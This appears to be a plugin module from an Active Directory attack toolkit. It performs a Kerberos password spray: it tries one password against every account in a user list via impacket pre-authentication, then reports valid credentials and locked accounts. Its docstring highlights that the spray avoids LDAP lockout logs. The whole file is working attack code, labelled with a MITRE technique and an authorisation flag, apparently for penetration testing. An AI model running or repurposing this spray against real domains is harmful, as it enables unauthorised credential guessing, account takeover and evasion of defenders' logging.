"""Kerberos-based password spray  -  no LDAP lockout logs, pre-auth only."""
import sys
import time
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.spray.kerberos_spray.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_preauth_attempts"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1110.003"],
}


def run(args: Any) -> int:
    dc_ip = getattr(args, "dc_ip", args.target)
    users_file = getattr(args, "users_file", None)
    password = getattr(args, "password", None)
    delay = getattr(args, "delay", 0)

    if not users_file or not password:
        print("[!] --users-file and --password required", file=sys.stderr)
        return 1

    with open(users_file) as f:
        users = [l.strip() for l in f if l.strip()]

    print(f"[*] Kerberos spray: {dc_ip} (1 password × {len(users)} users)")

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    valid = []
    for user in users:
        try:
            user_name = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                user_name, password, args.domain,
                None, None, None, dc_ip)
            valid.append(user)
            print(f"[+] VALID: {args.domain}\\{user} : {password}")
        except Exception as exc:
            err = str(exc)
            if "KDC_ERR_PREAUTH_FAILED" in err:
                pass
            elif "KDC_ERR_CLIENT_REVOKED" in err:
                print(f"[!] LOCKED/DISABLED: {user}")
            elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in err:
                pass
            else:
                print(f"  [-] {user}  -  {err[:60]}")

        if delay:
            time.sleep(delay)

    print(f"\n[*] Result: {len(valid)}/{len(users)} valid")
    return 0 if valid else 1
